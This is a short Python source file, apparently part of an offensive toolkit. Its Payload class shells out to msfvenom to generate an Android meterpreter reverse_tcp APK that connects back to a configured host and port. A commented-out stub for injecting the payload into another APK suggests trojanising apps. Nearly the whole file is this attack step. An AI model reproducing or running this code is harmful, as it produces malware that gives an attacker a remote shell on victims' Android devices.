import logging
import os
import glob

from .apk import Apk
from . import utilities


class Payload:
    def __init__(self, host, public_host=None):
        self.__payload_apk = None
        self.host = host
        self.public_host = public_host if public_host else host
        self.__generate_payload()

    def __generate_payload(self):
        payload_path = os.path.join(os.getcwd(), 'payload.apk')
        command=f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"
        logging.info('Generating payload...')
        utilities.run_command(command)
        logging.info('    ... Done')
        self.__payload_apk = Apk(payload_path)

    # def inject(self, apk):
    #     self.__payload_apk.decompile()

    #     pass
